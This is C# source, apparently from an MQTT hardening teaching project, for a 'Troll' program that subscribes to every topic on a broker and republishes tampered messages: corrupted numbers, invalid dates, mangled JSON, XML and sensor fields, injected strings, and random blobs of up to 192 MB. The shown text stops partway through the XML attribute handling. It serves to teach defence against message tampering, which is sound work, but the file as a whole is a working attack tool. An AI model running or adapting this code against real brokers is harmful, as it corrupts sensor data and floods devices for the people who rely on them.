using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;
using Waher.Content;
using Waher.Content.Xml;
using Waher.Events;
using Waher.Events.Console;
using Waher.Events.MQTT;
using Waher.Networking.MQTT;
using Waher.Networking.XMPP.Sensor;
using Waher.Persistence;
using Waher.Persistence.Files;
using Waher.Runtime.Cache;
using Waher.Runtime.Inventory;
using Waher.Runtime.Inventory.Loader;
using Waher.Runtime.Queue;
using Waher.Runtime.Settings;
using Waher.Script.Objects;
using Waher.Security;
using Waher.Things.SensorData;

namespace Troll
{
	/// <summary>
	/// This project implements a troll that tries to interrupt and destroy the communication between sensors and displays
	/// on an MQTT Broker. This project is presented for pedagogical reasons, and should only be used to help protect and
	/// harden services that use MQTT as a transport mechanism.
	/// 
	/// Note: Most of the program is written in linear fashion, so the reader can read as much as possible, from top to bottom, 
	/// without having to scroll or switch files.
	/// </summary>
	internal class Program
	{
		const int Trolliness = 3;   // 1=maximum. Higher values decrease probability of content being altered.

		/// <summary>
		/// Program entry point
		/// </summary>
		static async Task Main()
		{
			FilesProvider DBProvider = null;
			MqttClient Mqtt = null;
			string DeviceID = string.Empty;

			try
			{
				#region Setup

				// First, initialize environment and type inventory. This creates an inventory of types used by the application.
				// This is important for tasks such as data persistence, for example.
				TypesLoader.Initialize();

				// Setup Event Output to Console window
				Log.Register(new ConsoleEventSink());
				Log.Informational("Troll application starting...");

				// Setup database
				Log.Informational("Setting up database...");
				DBProvider = await FilesProvider.CreateAsync("Database", "Default", 8192, 10000, 8192, Encoding.UTF8, 10000, true, false);
				Database.Register(DBProvider);

				// Repair database, if an inproper shutdown is detected
				await DBProvider.RepairIfInproperShutdown(string.Empty);

				// Starting internal modules
				await Types.StartAllModules(60000);

				#endregion

				#region Device ID

				// Configuring Device ID

				DeviceID = await RuntimeSettings.GetAsync("Device.ID", string.Empty);

				if (string.IsNullOrEmpty(DeviceID))
				{
					Console.Out.WriteLine("Device ID has not been configured. Please provide the Device ID that will be used by this application.");

					DeviceID = UserInput("Device ID", DeviceID);
					await RuntimeSettings.SetAsync("Device.ID", DeviceID);
				}
				else
					Log.Informational("Using Device ID: " + DeviceID, DeviceID);

				#endregion

				#region Connecting to MQTT Broker

				// Configuring and connecting to MQTT Server

				do
				{
					// MQTT Configuration

					string MqttHost = await RuntimeSettings.GetAsync("MQTT.Host", string.Empty);
					int MqttPort = (int)await RuntimeSettings.GetAsync("MQTT.Port", 8883);
					bool MqttEncrypted = await RuntimeSettings.GetAsync("MQTT.Tls", true);
					string MqttUserName = await RuntimeSettings.GetAsync("MQTT.UserName", string.Empty);
					string MqttPassword = await RuntimeSettings.GetAsync("MQTT.Password", string.Empty);

					if (string.IsNullOrEmpty(MqttHost))
					{
						Console.Out.WriteLine("MQTT host not configured. Please provide the connection details below. If the default value presented is sufficient, just press ENTER.");

						MqttHost = UserInput("MQTT Host", MqttHost);
						await RuntimeSettings.SetAsync("MQTT.Host", MqttHost);

						MqttPort = UserInput("MQTT Port", MqttPort, 1, 65535);
						await RuntimeSettings.SetAsync("MQTT.Port", MqttPort);

						MqttEncrypted = (MqttPort == 8883);
						MqttEncrypted = UserInput("Encrypt with TLS", MqttEncrypted);
						await RuntimeSettings.SetAsync("MQTT.Tls", MqttEncrypted);

						MqttUserName = UserInput("MQTT UserName", MqttUserName);
						await RuntimeSettings.SetAsync("MQTT.UserName", MqttUserName);

						MqttPassword = UserInput("MQTT Password", MqttPassword);
						await RuntimeSettings.SetAsync("MQTT.Password", MqttPassword);
					}

					// Connecting to broker and waiting for connection to complete

					Log.Informational("Connecting to MQTT Broker...", DeviceID);

					TaskCompletionSource<bool> WaitForConnect = new TaskCompletionSource<bool>();

					Mqtt = new MqttClient(MqttHost, MqttPort, MqttEncrypted, MqttUserName, MqttPassword);

					Mqtt.OnConnectionError += (_, e) =>
					{
						Log.Error(e.Message, DeviceID);
						WaitForConnect.TrySetResult(false);
						return Task.CompletedTask;
					};

					Mqtt.OnError += (_, e) =>
					{
						Log.Error(e.Message, DeviceID);
						return Task.CompletedTask;
					};

					Mqtt.OnStateChanged += (_, NewState) =>
					{
						Log.Informational(NewState.ToString(), DeviceID);

						switch (NewState)
						{
							case MqttState.Offline:
							case MqttState.Error:
								WaitForConnect.TrySetResult(false);
								break;

							case MqttState.Connected:
								WaitForConnect.TrySetResult(true);
								break;
						}

						return Task.CompletedTask;
					};

					if (!await WaitForConnect.Task)
					{
						await Mqtt.DisposeAsync();
						Mqtt = null;
					}
				}
				while (Mqtt is null);

				#endregion

				#region Event Logging

				// Register MQTT event sink, allowing developer to follow what happens with devices.

				Log.Register(new MqttEventSink("MQTT Event Sink", Mqtt, "HardenMqtt/Events", true));
				Log.Informational("Troll connected to MQTT.", DeviceID);

				// Configure CTRL+Z to close application gracefully.

				#endregion

				#region CTRL-Z support

				CancellationTokenSource Operation = new CancellationTokenSource();
				AsyncQueue<MqttContent> InputQueue = new AsyncQueue<MqttContent>();

				Console.CancelKeyPress += (_, e) =>
				{
					e.Cancel = true;
					Operation.Cancel();
					InputQueue.Add(null);
				};

				#endregion

				#region Receiving Sensor Data

				Mqtt.OnContentReceived += (sender, e) =>
				{
					InputQueue.Add(e);
					return Task.CompletedTask;
				};

				Log.Informational("Subscribing to everything.", DeviceID);
				await Mqtt.SUBSCRIBE("#");

				#endregion

				#region Main loop

				Log.Informational("Troll application started... Press CTRL+C to terminate the application.", DeviceID);

				while (!Operation.IsCancellationRequested)
				{
					MqttContent e = await InputQueue.Wait();
					if (e is null)
						continue;

					try
					{
						string Digest = ComputeHash(e.Topic, e.Data);
						if (recentlySent.ContainsKey(Digest))
						{
							Console.Out.Write(' ');
							recentlySent.Remove(Digest);
							continue;
						}

						if (e.Data.Length > 65536)
							await TrollBlob(Mqtt, e.Topic, e.Data);
						else
						{
							string s = Encoding.UTF8.GetString(e.Data);

							if (long.TryParse(s, out long i))
								await TrollInteger(Mqtt, e.Topic, i);
							else if (CommonTypes.TryParse(s, out double d))
								await TrollDouble(Mqtt, e.Topic, d);
							else if (TimeSpan.TryParse(s, out TimeSpan TS))
								await TrollTimeSpan(Mqtt, e.Topic, TS);
							else if (DateTime.TryParse(s, out DateTime TP))
								await TrollDateTime(Mqtt, e.Topic, TP);
							else if (XML.TryParse(s, out TP))
								await TrollDateTime(Mqtt, e.Topic, TP);
							else if (Uri.TryCreate(s, UriKind.Absolute, out Uri Link))
								await TrollUri(Mqtt, e.Topic, Link);
							else if (TryParseJsonObject(s, out Dictionary<string, object> Object))
								await TrollObject(Mqtt, e.Topic, Object);
							else if (TryParseJsonArray(s, out Array Vector))
								await TrollArray(Mqtt, e.Topic, Vector);
							else if (TryParseXml(s, out XmlDocument Xml))
								await TrollXml(Mqtt, e.Topic, Xml);
							else
								await TrollString(Mqtt, e.Topic, s);
						}
					}
					catch (Exception ex)
					{
						Log.Critical(ex, DeviceID);
					}
				}

				#endregion
			}
			catch (Exception ex)
			{
				// Display exception terminating application
				Log.Alert(ex, DeviceID);
			}
			finally
			{
				// Shut down database gracefully

				Log.Informational("Troll application stopping...", DeviceID);

				if (!(Mqtt is null))
				{
					await Mqtt.DisposeAsync();
					Mqtt = null;
				}

				if (!(DBProvider is null))
					await DBProvider.Flush();

				await Types.StopAllModules();
				Log.Terminate();
			}
		}

		#region UserInput methods

		/// <summary>
		/// Asks the user to input a string.
		/// </summary>
		/// <param name="Label">Label</param>
		/// <param name="Default">Default value</param>
		/// <returns>User input</returns>
		private static string UserInput(string Label, string Default)
		{
			Console.Out.Write(Label);

			if (!string.IsNullOrEmpty(Default))
			{
				Console.Out.Write(" (default: ");
				Console.Out.Write(Default);
				Console.Out.Write(")");
			}

			Console.Out.Write(": ");

			string s = Console.In.ReadLine();

			if (string.IsNullOrEmpty(s))
				return Default;
			else
				return s;
		}

		/// <summary>
		/// Asks the user to input a Boolean value.
		/// </summary>
		/// <param name="Label">Label</param>
		/// <param name="Default">Default value</param>
		/// <returns>User input</returns>
		private static bool UserInput(string Label, bool Default)
		{
			string s;
			bool Result;

			do
			{
				s = UserInput(Label, Default.ToString());
			}
			while (!bool.TryParse(s, out Result));

			return Result;
		}

		/// <summary>
		/// Asks the user to input a 32-bit integer.
		/// </summary>
		/// <param name="Label">Label</param>
		/// <param name="Default">Default value</param>
		/// <param name="Min">Smallest permitted value.</param>
		/// <param name="Max">Largest permitted value.</param>
		/// <returns>User input</returns>
		private static int UserInput(string Label, int Default, int Min, int Max)
		{
			string s;
			int Result;

			do
			{
				s = UserInput(Label, Default.ToString());
			}
			while (!int.TryParse(s, out Result) || Result < Min || Result > Max);

			return Result;
		}

		#endregion

		#region Parsing Methods

		/// <summary>
		/// Tries to parse a string as a JSON object.
		/// </summary>
		/// <param name="s">String</param>
		/// <param name="Result">Parsed Object</param>
		/// <returns>If object could be parsed.</returns>
		private static bool TryParseJsonObject(string s, out Dictionary<string, object> Result)
		{
			Result = null;
			s = s.Trim();
			if (!s.StartsWith("{") || !s.EndsWith("}"))
				return false;

			try
			{
				object Parsed = JSON.Parse(s);
				Result = Parsed as Dictionary<string, object>;
				return !(Result is null);
			}
			catch
			{
				Result = null;
				return false;
			}
		}

		/// <summary>
		/// Tries to parse a string as a JSON array.
		/// </summary>
		/// <param name="s">String</param>
		/// <param name="Result">Parsed array</param>
		/// <returns>If array could be parsed.</returns>
		private static bool TryParseJsonArray(string s, out Array Result)
		{
			Result = null;
			s = s.Trim();
			if (!s.StartsWith("[") || !s.EndsWith("]"))
				return false;

			try
			{
				object Parsed = JSON.Parse(s);
				Result = Parsed as Array;
				return !(Result is null);
			}
			catch
			{
				Result = null;
				return false;
			}
		}

		/// <summary>
		/// Tries to parse a string as an XML document.
		/// </summary>
		/// <param name="s">String</param>
		/// <param name="Result">Parsed XML document</param>
		/// <returns>If document could be parsed.</returns>
		private static bool TryParseXml(string s, out XmlDocument Result)
		{
			Result = null;
			s = s.Trim();
			if (!s.StartsWith("<") || !s.EndsWith(">") || !XML.IsValidXml(s))
				return false;

			try
			{
				XmlDocument Doc = new XmlDocument();
				Doc.LoadXml(s);

				Result = Doc;
				return true;
			}
			catch
			{
				Result = null;
				return false;
			}
		}

		#endregion

		#region Trolling

		/// <summary>
		/// Trolls recipients of BLOBs
		/// </summary>
		/// <param name="Mqtt">MQTT Client</param>
		/// <param name="Topic">Topic</param>
		/// <param name="Data">Data received on topic.</param>
		private static async Task TrollBlob(MqttClient Mqtt, string Topic, byte[] Data)
		{
			int c = Data.Length;
			if (c > 1024)
			{
				if (RandomInt(1 * Trolliness) == 0)
					await Publish(Mqtt, Topic, RandomBytes(1024), true, 'r');
			}
			else
			{
				switch (RandomInt(4 * Trolliness))
				{
					case 0: // Half size
						Array.Resize(ref Data, c / 2);
						await Publish(Mqtt, Topic, Data, true, 'h');
						break;

					case 1: // Double size
						Array.Resize(ref Data, c * 2);
						Array.Copy(Data, 0, Data, c, c);
						await Publish(Mqtt, Topic, Data, true, 'd');
						break;

					case 2: // Randomize
						RandomBytes(Data);
						await Publish(Mqtt, Topic, Data, true, 'r');
						break;

					case 3: // Large BLOB
						await PublishRandomBlob(Mqtt, Topic);
						break;
				}
			}
		}

		private static async Task PublishRandomBlob(MqttClient Mqtt, string Topic)
		{
			ulong i = RandomInt(1000);

			if (i < 5000)
				await Publish(Mqtt, Topic, RandomBytes(1024), true, 'k');
			else if (i < 9900)
				await Publish(Mqtt, Topic, RandomBytes(1024 * 1024), false, 'M');           // Play nice. Retaining will create a lot of data to download during initial subscription.
			else if (i < 9990)
				await Publish(Mqtt, Topic, RandomBytes(16 * 1024 * 1024), false, 'H');      // Play nice. Retaining will create a lot of data to download during initial subscription.
			else
				await Publish(Mqtt, Topic, RandomBytes(192 * 1024 * 1024), false, 'G');     // Play nice. Retaining will create a lot of data to download during initial subscription.
		}

		/// <summary>
		/// Trolls recipients of integers
		/// </summary>
		/// <param name="Mqtt">MQTT Client</param>
		/// <param name="Topic">Topic</param>
		/// <param name="i">Integer received on topic.</param>
		private static async Task TrollInteger(MqttClient Mqtt, string Topic, long i)
		{
			switch (RandomInt(6 * Trolliness))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, (i / 2).ToString(), 'h');
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, (i * 2).ToString(), 'd');
					break;

				case 2: // Negate
					await Publish(Mqtt, Topic, (-i).ToString(), 'n');
					break;

				case 3: // Randomize
					await Publish(Mqtt, Topic, RandomInt().ToString(), 'r');
					break;

				case 4: // String
					await Publish(Mqtt, Topic, "Kilroy was here", 's');
					break;

				case 5: // Large BLOB
					await PublishRandomBlob(Mqtt, Topic);
					break;
			}
		}

		private static async Task TrollDouble(MqttClient Mqtt, string Topic, double d)
		{
			switch (RandomInt(7 * Trolliness))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, CommonTypes.Encode(d / 2), 'h');
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, CommonTypes.Encode(d * 2), 'd');
					break;

				case 2: // Negate
					await Publish(Mqtt, Topic, CommonTypes.Encode(-d), 'n');
					break;

				case 3: // Randomize
					await Publish(Mqtt, Topic, CommonTypes.Encode(2 * d * RandomDouble(1)), 'r');
					break;

				case 4: // Change format
					await Publish(Mqtt, Topic, d.ToString(), 'f');
					break;

				case 5: // String
					await Publish(Mqtt, Topic, "Kilroy was here", 's');
					break;

				case 6: // Large BLOB
					await PublishRandomBlob(Mqtt, Topic);
					break;
			}
		}

		private static async Task TrollTimeSpan(MqttClient Mqtt, string Topic, TimeSpan TS)
		{
			switch (RandomInt(6 * Trolliness))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, TimeSpan.FromTicks(TS.Ticks / 2).ToString(), 'h');
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, TimeSpan.FromTicks(TS.Ticks * 2).ToString(), 'd');
					break;

				case 2: // Negate
					await Publish(Mqtt, Topic, (-TS).ToString(), 'n');
					break;

				case 3: // Randomize
					await Publish(Mqtt, Topic, TimeSpan.FromTicks((long)(2 * TS.Ticks * RandomDouble(1))).ToString(), 'r');
					break;

				case 4: // String
					await Publish(Mqtt, Topic, "Kilroy was here", 's');
					break;

				case 5: // Large BLOB
					await PublishRandomBlob(Mqtt, Topic);
					break;
			}
		}

		private static async Task TrollDateTime(MqttClient Mqtt, string Topic, DateTime TP)
		{
			switch (RandomInt(11 * Trolliness))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, XML.Encode(new DateTime(TP.Ticks / 2).ToString()), 'h');
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, XML.Encode(new DateTime(TP.Ticks * 2).ToString()), 'd');
					break;

				case 2: // Invalid year
					await Publish(Mqtt, Topic,
						(TP.Year + 10).ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"), 'y');
					break;

				case 3: // Invalid month
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						(TP.Month + 10).ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"), 'm');
					break;

				case 4: // Invalid day
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						(TP.Day + 10).ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"), 'D');
					break;

				case 5: // Invalid hour
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						(TP.Hour + 10).ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"), 't');
					break;

				case 6: // Invalid minute
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						(TP.Minute + 10).ToString("D2") + ":" +
						TP.Second.ToString("D2"), 'i');
					break;

				case 7: // Invalid second
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						(TP.Second + 10).ToString("D2"), 'S');
					break;

				case 8: // Randomize
					await Publish(Mqtt, Topic, XML.Encode(new DateTime((long)(2 * TP.Ticks * RandomDouble(1)))), 'r');
					break;

				case 9: // String
					await Publish(Mqtt, Topic, "Kilroy was here", 's');
					break;

				case 10: // Large BLOB
					await PublishRandomBlob(Mqtt, Topic);
					break;
			}
		}

		private static async Task TrollUri(MqttClient Mqtt, string Topic, Uri Link)
		{
			int c = Link.OriginalString.Length;

			switch (RandomInt(6 * Trolliness))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, Link.OriginalString[0..(c / 2)], 'h');
					break;

				case 1: // Change scheme
					UriBuilder b = new UriBuilder(Link)
					{
						Scheme = Link.Scheme + "x"
					};

					await Publish(Mqtt, Topic, b.Uri.ToString(), 'c');
					break;

				case 2: // Change domain
					b = new UriBuilder(Link)
					{
						Host = "example.com"
					};

					await Publish(Mqtt, Topic, b.Uri.ToString(), 'N');
					break;

				case 3: // Modify URL
					b = new UriBuilder(Link)
					{
						Path = Link.LocalPath + "/Kilroy"
					};

					await Publish(Mqtt, Topic, b.Uri.ToString(), 'u');
					break;

				case 4: // String
					await Publish(Mqtt, Topic, "Kilroy was here", 's');
					break;

				case 5: // Large BLOB
					await PublishRandomBlob(Mqtt, Topic);
					break;
			}
		}

		private static async Task TrollString(MqttClient Mqtt, string Topic, string s)
		{
			int c = s.Length;

			switch (RandomInt(4 * Trolliness))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, s[0..(c / 2)], 'h');
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, s + s, 'd');
					break;

				case 2: // String
					await Publish(Mqtt, Topic, "Kilroy was here", 's');
					break;

				case 3: // Large BLOB
					await PublishRandomBlob(Mqtt, Topic);
					break;
			}
		}

		private static async Task TrollObject(MqttClient Mqtt, string Topic, Dictionary<string, object> Object)
		{
			ulong i = RandomInt(10 * Trolliness);

			if (i == 0)
				await PublishRandomBlob(Mqtt, Topic);
			else
			{
				Dictionary<string, object> Object2 = new Dictionary<string, object>();

				foreach (KeyValuePair<string, object> P in Object)
				{
					int c = P.Key.Length;

					switch (RandomInt(5 * Trolliness))
					{
						case 0: // Half key
							Object2[P.Key[0..(c / 2)]] = P.Value;
							break;

						case 1: // Double key
							Object2[P.Key + P.Key] = P.Value;
							break;

						case 2: // Random key
							Object2[Base64Url.Encode(RandomBytes(16))] = P.Value;
							break;

						case 3: // Ignore key
							break;

						case 4:
							Object2[P.Key] = TrollValue(P.Value);
							break;
					}
				}

				await Publish(Mqtt, Topic, JSON.Encode(Object2, false), 'o');
			}
		}

		private static async Task TrollArray(MqttClient Mqtt, string Topic, Array Array)
		{
			ulong i = RandomInt(10 * Trolliness);

			if (i == 0)
				await PublishRandomBlob(Mqtt, Topic);
			else
			{
				List<object> Array2 = new List<object>();

				foreach (object Item in Array)
				{
					switch (RandomInt(4 * Trolliness))
					{
						case 0:
							Array2.Add(Item);
							break;

						case 1:
							Array2.Add(TrollValue(Item));
							break;

						case 2: // Random value
							Array2.Add(Base64Url.Encode(RandomBytes(16)));
							break;

						case 3: // Ignore item
							break;
					}
				}

				await Publish(Mqtt, Topic, JSON.Encode(Array2, false), 'a');
			}
		}

		private static async Task TrollXml(MqttClient Mqtt, string Topic, XmlDocument Xml)
		{
			if (Topic == "HardenMqtt/Events")
				return;		// Avoid messing up event log, for pedagogical reasons.

			ulong i = RandomInt(10 * Trolliness);

			if (i == 0)
			{
				await PublishRandomBlob(Mqtt, Topic);
				return;
			}

			SensorData SensorData;

			try
			{
				SensorData = SensorClient.ParseFields(Xml.DocumentElement);
			}
			catch
			{
				SensorData = null;
			}

			if (SensorData?.Fields is null)
			{
				StringBuilder sb = new StringBuilder();
				XmlWriterSettings Settings = new XmlWriterSettings()
				{
					OmitXmlDeclaration = true
				};
				using XmlWriter Output = XmlWriter.Create(sb, Settings);

				Troll(Xml.DocumentElement, Output);

				Output.Flush();

				await Publish(Mqtt, Topic, sb.ToString(), 'x');
			}
			else
			{
				List<Field> Fields = new List<Field>();

				foreach (Field Field in SensorData.Fields)
				{
					switch (RandomInt(10 * Trolliness))
					{
						case 0: // Leave Name as is
							break;

						case 1: // Halve Name
							Field.Name = Field.Name[0..(Field.Name.Length / 2)];
							break;

						case 2: // Double Name
							Field.Name += Field.Name;
							break;

						case 3: // Halve Value
							if (Field is BooleanField BooleanField)
								BooleanField.Value = false;
							else if (Field is Int32Field Int32Field)
								Int32Field.Value /= 2;
							else if (Field is Int64Field Int64Field)
								Int64Field.Value /= 2;
							else if (Field is DateField DateField)
								DateField.Value = new DateTime(DateField.Value.Ticks / 2);
							else if (Field is DateTimeField DateTimeField)
								DateTimeField.Value = new DateTime(DateTimeField.Value.Ticks / 2);
							else if (Field is DurationField DurationField)
							{
								DurationField.Value = new Duration(
									DurationField.Value.Negation,
									DurationField.Value.Years / 2,
									DurationField.Value.Months / 2,
									DurationField.Value.Days / 2,
									DurationField.Value.Hours / 2,
									DurationField.Value.Minutes / 2,
									DurationField.Value.Seconds / 2);
							}
							else if (Field is EnumField EnumField)
							{
								string s = EnumField.Value.ToString();
								Fields.Add(new StringField(EnumField.Thing, EnumField.Timestamp, EnumField.Name, s[0..(s.Length / 2)], EnumField.Type, EnumField.QoS));
								continue;
							}
							else if (Field is QuantityField QuantityField)
								QuantityField.Value /= 2;
							else if (Field is StringField StringField)
								StringField.Value = StringField.Value[0..(StringField.Value.Length / 2)];
							else if (Field is TimeField TimeField)
								TimeField.Value /= 2;
							break;

						case 4: // Double Value
							if (Field is BooleanField BooleanField2)
								BooleanField2.Value = true;
							else if (Field is Int32Field Int32Field2)
								Int32Field2.Value *= 2;
							else if (Field is Int64Field Int64Field2)
								Int64Field2.Value *= 2;
							else if (Field is DateField DateField2)
								DateField2.Value = new DateTime(DateField2.Value.Ticks * 2);
							else if (Field is DateTimeField DateTimeField2)
								DateTimeField2.Value = new DateTime(DateTimeField2.Value.Ticks * 2);
							else if (Field is DurationField DurationField2)
							{
								DurationField2.Value = new Duration(
									DurationField2.Value.Negation,
									DurationField2.Value.Years * 2,
									DurationField2.Value.Months * 2,
									DurationField2.Value.Days * 2,
									DurationField2.Value.Hours * 2,
									DurationField2.Value.Minutes * 2,
									DurationField2.Value.Seconds * 2);
							}
							else if (Field is EnumField EnumField2)
							{
								string s = EnumField2.Value.ToString();
								Fields.Add(new StringField(EnumField2.Thing, EnumField2.Timestamp, EnumField2.Name, s + s, EnumField2.Type, EnumField2.QoS));
								continue;
							}
							else if (Field is QuantityField QuantityField2)
								QuantityField2.Value *= 2;
							else if (Field is StringField StringField2)
								StringField2.Value += StringField2.Value;
							else if (Field is TimeField TimeField2)
								TimeField2.Value *= 2;
							break;

						case 5: // Negate Value
							if (Field is BooleanField BooleanField3)
								BooleanField3.Value = !BooleanField3.Value;
							else if (Field is Int32Field Int32Field3)
								Int32Field3.Value = -Int32Field3.Value;
							else if (Field is Int64Field Int64Field3)
								Int64Field3.Value = -Int64Field3.Value;
							else if (Field is DateField DateField3)
								DateField3.Value = DateTime.MinValue;
							else if (Field is DateTimeField DateTimeField3)
								DateTimeField3.Value = DateTime.MinValue;
							else if (Field is DurationField DurationField3)
							{
								DurationField3.Value = new Duration(
									!DurationField3.Value.Negation,
									DurationField3.Value.Years,
									DurationField3.Value.Months,
									DurationField3.Value.Days,
									DurationField3.Value.Hours,
									DurationField3.Value.Minutes,
									DurationField3.Value.Seconds);
							}
							else if (Field is EnumField EnumField3)
							{
								Fields.Add(new StringField(EnumField3.Thing, EnumField3.Timestamp, EnumField3.Name, string.Empty, EnumField3.Type, EnumField3.QoS));
								continue;
							}
							else if (Field is QuantityField QuantityField3)
								QuantityField3.Value = -QuantityField3.Value;
							else if (Field is StringField StringField3)
								StringField3.Value = string.Empty;
							else if (Field is TimeField TimeField3)
								TimeField3.Value = -TimeField3.Value;
							break;

						case 6: // Randomize
							if (Field is BooleanField BooleanField4)
								BooleanField4.Value = RandomInt(2) != 0;
							else if (Field is Int32Field Int32Field4)
								Int32Field4.Value = (int)RandomInt();
							else if (Field is Int64Field Int64Field4)
								Int64Field4.Value = (long)RandomInt();
							else if (Field is DateField DateField4)
							{
								int Year = (int)RandomInt(10000);
								int Month = (int)(RandomInt(12) + 1);
								int Day = (int)(RandomInt((uint)DateTime.DaysInMonth(Year, Month)) + 1);

								DateField4.Value = new DateTime(Year, Month, Day);
							}
							else if (Field is DateTimeField DateTimeField4)
							{
								int Year = (int)RandomInt(10000);
								int Month = (int)(RandomInt(12) + 1);
								int Day = (int)(RandomInt((uint)DateTime.DaysInMonth(Year, Month)) + 1);
								int Hour = (int)RandomInt(24);
								int Minute = (int)RandomInt(60);
								int Second = (int)RandomInt(60);

								DateTimeField4.Value = new DateTime(Year, Month, Day, Hour, Minute, Second);
							}
							else if (Field is DurationField DurationField4)
							{
								int Years = (int)RandomInt((uint)(DurationField4.Value.Years * 2 + 1));
								int Months = (int)RandomInt((uint)(DurationField4.Value.Months * 2 + 1));
								int Days = (int)RandomInt((uint)(DurationField4.Value.Days * 2 + 1));
								int Hours = (int)RandomInt((uint)(DurationField4.Value.Hours * 2 + 1));
								int Minutes = (int)RandomInt((uint)(DurationField4.Value.Minutes * 2 + 1));
								int Seconds = (int)RandomInt((uint)(DurationField4.Value.Seconds * 2 + 1));

								DurationField4.Value = new Duration(DurationField4.Value.Negation, Years, Months, Days, Hours, Minutes, Seconds);
							}
							else if (Field is EnumField EnumField4)
							{
								Array Values = Enum.GetValues(EnumField4.Value.GetType());
								EnumField4.Value = (Enum)Values.GetValue((int)RandomInt((uint)Values.Length));
							}
							else if (Field is QuantityField QuantityField4)
								QuantityField4.Value = RandomDouble(QuantityField4.Value * 2);
							else if (Field is StringField StringField4)
								StringField4.Value = Base64Url.Encode(RandomBytes(16));
							else if (Field is TimeField TimeField4)
								TimeField4.Value *= RandomDouble(2);
							break;

						case 7: // String
							Fields.Add(new StringField(Field.Thing, Field.Timestamp, Field.Name, "Kilroy was here", Field.Type, Field.QoS));
							break;

						case 8: // Change type
							object Value = TrollValue(Field.ObjectValue);

							if (Value is bool b)
								Fields.Add(new BooleanField(Field.Thing, Field.Timestamp, Field.Name, b, Field.Type, Field.QoS));
							else if (Value is int i2)
								Fields.Add(new Int32Field(Field.Thing, Field.Timestamp, Field.Name, i2, Field.Type, Field.QoS));
							else if (Value is long l)
								Fields.Add(new Int64Field(Field.Thing, Field.Timestamp, Field.Name, l, Field.Type, Field.QoS));
							else if (Value is DateTime TP)
								Fields.Add(new DateTimeField(Field.Thing, Field.Timestamp, Field.Name, TP, Field.Type, Field.QoS));
							else if (Value is Duration D)
								Fields.Add(new DurationField(Field.Thing, Field.Timestamp, Field.Name, D, Field.Type, Field.QoS));
							else if (Value is Enum E)
								Fields.Add(new EnumField(Field.Thing, Field.Timestamp, Field.Name, E, Field.Type, Field.QoS));
							else if (Value is TimeSpan TS)
								Fields.Add(new TimeField(Field.Thing, Field.Timestamp, Field.Name, TS, Field.Type, Field.QoS));
							else if (Value is double d)
								Fields.Add(new QuantityField(Field.Thing, Field.Timestamp, Field.Name, d, CommonTypes.GetNrDecimals(d), string.Empty, Field.Type, Field.QoS));
							else if (Value is PhysicalQuantity Q)
								Fields.Add(new QuantityField(Field.Thing, Field.Timestamp, Field.Name, Q.Magnitude, CommonTypes.GetNrDecimals(Q.Magnitude), Q.Unit.ToString(), Field.Type, Field.QoS));
							else
								Fields.Add(new StringField(Field.Thing, Field.Timestamp, Field.Name, Value?.ToString(), Field.Type, Field.QoS));
							continue;

						case 9: // Ignore field
							continue;
					}

					Fields.Add(Field);
				}

				SensorData = new SensorData(Fields.ToArray());

				await Publish(Mqtt, Topic, SensorData.PayloadXml, 'x');
			}
		}

		private static void Troll(XmlElement Element, XmlWriter Output)
		{
			switch (RandomInt(8 * Trolliness))
			{
				case 0: // Leave FQN as is
				default:
					Output.WriteStartElement(Element.LocalName, Element.NamespaceURI);
					break;

				case 1: // Halve Local Name
					Output.WriteStartElement(Element.LocalName[0..(Element.LocalName.Length / 2)], Element.NamespaceURI);
					break;

				case 2: // Double Local Name
					Output.WriteStartElement(Element.LocalName + Element.LocalName, Element.NamespaceURI);
					break;

				case 3: // Halve Namespace
					Output.WriteStartElement(Element.LocalName, Element.NamespaceURI[0..(Element.NamespaceURI.Length / 2)]);
					break;

				case 4: // Double Namespace
					Output.WriteStartElement(Element.LocalName, Element.NamespaceURI + Element.NamespaceURI);
					break;

				case 5: // Random Local Name
					Output.WriteStartElement("_" + Hashes.BinaryToString(RandomBytes(16)), Element.NamespaceURI);
					break;

				case 6: // Random Namespace
					Output.WriteStartElement(Element.LocalName, Base64Url.Encode(RandomBytes(16)));
					break;

				case 7: // Skip element
					return;
			}

			foreach (XmlAttribute Attribute in Element.Attributes)
			{
				if (Attribute.Name == "xmlns" || Attribute.Prefix == "xmlns")
					continue;

				switch (RandomInt(8 * Trolliness))
				{
					case 0: // Leave attribute as is
						Output.WriteAttributeString(Attribute.Name, Attribute.Value);
						break;

					case 1: // Halve Attribute Name
						Output.WriteAttributeString(Attribute.Name[0..(Attribute.Name.Length / 2)], Attribute.Value);
						break;

					case 2: // Double Attribute Name
